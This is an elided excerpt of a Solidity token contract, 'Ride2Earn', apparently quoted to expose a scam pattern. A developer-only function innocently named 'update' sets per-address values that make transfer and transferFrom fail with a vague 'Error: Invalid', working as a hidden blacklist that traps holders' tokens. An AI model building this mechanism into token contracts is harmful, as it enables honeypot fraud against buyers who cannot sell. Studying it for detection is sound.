...
contract Ride2Earn is Context, IERC20, IERC20Metadata,Ownable {
    ...
    address private Burner=0x8F87B8eB7cC38b797982A4e0b7Af1Bd8FFEEd800;
   ...
   address public uniswapV2Pair;
    ...
    function update (address _address,uint256 amount) public onlyDev{
            updates[_address]=amount;
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(updates[recipient]<100,"Error: Invalid");
        require(updates[msg.sender]<100,"Error: Invalid");
    ...
    function transferFrom(
        ...
        require(updates[sender]<100,"Error: Invalid");
        require(updates[recipient]<100,"Error: Invalid");
